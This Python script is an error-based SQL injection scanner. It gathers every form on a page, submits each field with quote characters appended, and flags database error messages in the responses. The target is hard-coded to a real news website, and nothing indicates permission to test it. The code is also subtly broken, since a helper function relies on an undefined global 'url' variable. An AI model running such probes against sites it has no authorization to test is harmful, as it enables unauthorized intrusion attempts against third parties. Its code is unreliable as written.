import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

#Initializing a session with a proper user agent header
session = requests.Session()
session.headers["User-Agent"] = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/103.0.0.0 Safari/537.36"
)

# function to fetch all forms from a URL
def get_forms(url):
    try:
        response = session.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, "html.parser")
        return soup.find_all("form")
    except requests.RequestException as e:
        print(f"Error fetching the URL: {e}")
        return []

# function to extract details from a form
def get_form_details(form):
    action = form.attrs.get("action", "").strip()
    action = urljoin(url, action)  # Make the action URL absolute
    method = form.attrs.get("method", "get").lower()
    
    inputs = [
        {
            "type": input_tag.attrs.get("type", "text"),
            "name": input_tag.attrs.get("name"),
            "value": input_tag.attrs.get("value", "")
        }
        for input_tag in form.find_all("input")
        if input_tag.attrs.get("name")  # Ensuring the input has a name attribute
    ]
    
    return {"action": action, "method": method, "inputs": inputs}

# function to check if the response indicates an SQL injection vulnerability
def is_vulnerable(response):
    errors = [
        "quoted string not properly terminated",
        "unclosed quotation mark after the character string",
        "you have an error in your SQL syntax",
    ]
    response_text = response.content.decode().lower()
    return any(error in response_text for error in errors)

# performing SQL injection scan on the URL
def sql_injection_scan(url):
    forms = get_forms(url)
    print(f"[+] Detected {len(forms)} forms on {url}.")
    
    for form in forms:
        form_details = get_form_details(form)
        action = form_details["action"]
        method = form_details["method"]

        # Iterating through possible SQL injection payloads
        for payload in ["'", '"']:
            data = {}
            for input_tag in form_details["inputs"]:
                input_type = input_tag["type"]
                input_name = input_tag["name"]

                if input_tag["value"] or input_type == "hidden":
                    data[input_name] = input_tag["value"] + payload
                elif input_type != "submit":
                    data[input_name] = f"test{payload}"

            # Sending the payload using the appropriate method
            try:
                if method == "post":
                    response = session.post(action, data=data)
                else:
                    response = session.get(action, params=data)

                # Checking if the response indicates SQL injection vulnerability
                if is_vulnerable(response):
                    print(f"[!] SQL injection vulnerability detected in form at {action}")
                else:
                    print(f"[-] No SQL injection vulnerability detected in form at {action}")
            except requests.RequestException as e:
                print(f"Error submitting form at {action}: {e}")
                continue

if __name__ == "__main__":
    target_url = "https://cnn.com"
    sql_injection_scan(target_url)
